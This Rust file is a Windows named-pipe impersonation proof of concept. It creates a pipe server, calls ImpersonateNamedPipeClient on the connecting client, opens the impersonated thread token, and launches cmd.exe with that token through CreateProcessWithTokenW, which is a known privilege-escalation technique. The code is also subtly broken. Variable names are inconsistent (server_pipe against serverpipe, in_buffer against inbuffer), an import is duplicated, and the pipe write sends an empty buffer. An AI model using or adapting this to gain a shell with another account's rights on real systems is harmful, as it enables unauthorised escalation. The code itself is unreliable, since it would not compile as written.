use std::alloc::{alloc, Layout};
use std::ffi::c_void;
use std::fmt::Write;
use std::io::Read;
use std::mem::transmute;
use winapi::ctypes::c_void;
use winapi::ctypes::{c_char, c_schar};
use winapi::shared::ntdef::ULONGLONG;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{FlushFileBuffers, ReadFile, WriteFile, CREATE_NEW};
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA, LoadLibraryW};
use winapi::um::memoryapi::ReadProcessMemory;
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, WriteProcessMemory};
use winapi::um::processthreadsapi::{
    CreateThread, GetCurrentProcess, GetCurrentThread, OpenProcessToken, OpenThreadToken,
    PROCESS_INFORMATION, STARTUPINFOA, STARTUPINFOW,
};
use winapi::um::securitybaseapi::DuplicateTokenEx;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{
    SecurityImpersonation, TokenAccessInformation, TOKEN_ADJUST_DEFAULT, TOKEN_ADJUST_SESSIONID,
    TOKEN_ALL_ACCESS, TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY, WCHAR,
};
use winapi::um::winuser::MessageBoxW;
// use widestring;
use std::ffi::{CStr, CString};

use winapi::um::namedpipeapi::*;
use winapi::um::winbase::{
    CreateNamedPipeA, CreateProcessWithTokenW, CREATE_NEW_CONSOLE, LOGON_WITH_PROFILE,
    PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE,
};

fn main() {
    let mut pipe_name = "\\\\.\\pipe\\mypipe\0";
    let server_pipe = unsafe {
        CreateNamedPipeA(
            pipe_name.as_ptr() as *const i8,
            0x3,
            0x4,
            2,
            1024,
            1024,
            0,
            std::ptr::null_mut(),
        )
    };
    let res = unsafe { ConnectNamedPipe(server_pipe, std::ptr::null_mut()) };

    let mut in_buffer: [u8; 1024] = [0; 1024];
    let mut out_buffer: [u8; 1024] = [0; 1024];

    let writers = unsafe {
        WriteFile(
            server_pipe,
            in_buffer.as_mut_ptr() as *mut c_void,
            "received hello world from server\0".as_bytes().len() as u32,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
    };

    unsafe {
        FlushFileBuffers(serverpipe);

        let readres = ReadFile(
            serverpipe,
            inbuffer.as_mut_ptr() as *mut c_void,
            "received hello world from server\0".as_bytes().len() as u32,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );
        println!(
            "{}",
            String::from_utf8_lossy(&inbuffer).trim_end_matches('\0')
        );

        FlushFileBuffers(serverpipe);

        let r = ImpersonateNamedPipeClient(serverpipe);

        let mut tokenhandle = 0 as *mut c_void;
        OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, 0, &mut tokenhandle);

        let mut procname = "C:\\Windows\\System32\\cmd.exe"
            .encode_utf16()
            .collect::<Vec<u16>>();
        procname.push(0 as u16);

        let mut si = std::mem::zeroed::<STARTUPINFOW>();
        let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();

        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        CreateProcessWithTokenW(
            tokenhandle,
            1,
            procname.as_ptr() as *const u16,
            std::ptr::null_mut(),
            CREATE_NEW_CONSOLE,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut si,
            &mut pi,
        );
    }
}
